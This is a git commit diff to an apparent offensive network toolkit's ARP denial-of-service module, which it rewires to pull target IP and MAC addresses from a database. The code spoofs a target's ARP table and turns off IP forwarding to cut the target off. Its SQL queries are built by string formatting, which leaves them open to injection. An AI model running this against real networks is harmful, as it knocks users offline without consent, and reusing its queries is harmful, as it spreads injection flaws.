d86905815c8ee2c423216895627b98dc9e5aaf07
George Hughey <ghughey@umd.edu>
2016-10-25 04:14:32 +0000

    Made arp able to use the database

--- capabilities/arp/arpDos.py
+++ capabilities/arp/arpDos.py
@@ -10,7 +10,8 @@ from capability import *
 #ex: arpSpoof("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
 class arpDos(Capability):
 
-    def __init__(self):
+    def __init__(self, core):
+        super(arpDos, self).__init__(core)
         self.name = "Arp Dos"
         '''self.options = {
             "masq_ip"   : Option("masq_ip", "", "IP to Masquerade as", True),
@@ -25,21 +26,27 @@ class arpDos(Capability):
             "dest": Option("dest", "", "ID of the target", True),
             }
         self.help_text = INFO + "Spoof the arp table of a target with our ip. We will not forward their traffic, effectively DOSsing them."
-
+    
+    def exec_command(self, comm):
+        self.core.cur.execute(comm)
+        return self.core.cur.fetchall()[0][0]
+    
     def getVars(self):
-        self.masq_ip = exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
+        self.masq_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
         self.masq_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
         self.source_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
+        self.source_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
         self.dest_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
         self.dest_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
 
     def arpGo(self):
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        return arpBegin(self.masq_ip, self.masq_mac, self.source_mac. self.dest_ip, self.dest_mac)
+        return arpBegin(self.masq_ip, self.masq_mac, self.source_mac, self.dest_ip, self.dest_mac)
    
     def restore(self):
+        self.getVars()
         self.proc.terminate()
-        arpEnd(self.get_value("masq_ip"), self.get_value("masq_mac"), self.get_value("dest_ip"), self.get_value("dest_mac"))
+        arpEnd(self.masq_ip, self.masq_mac, self.dest_ip, self.dest_mac)
 
     def launch(self):
         self.getVars()
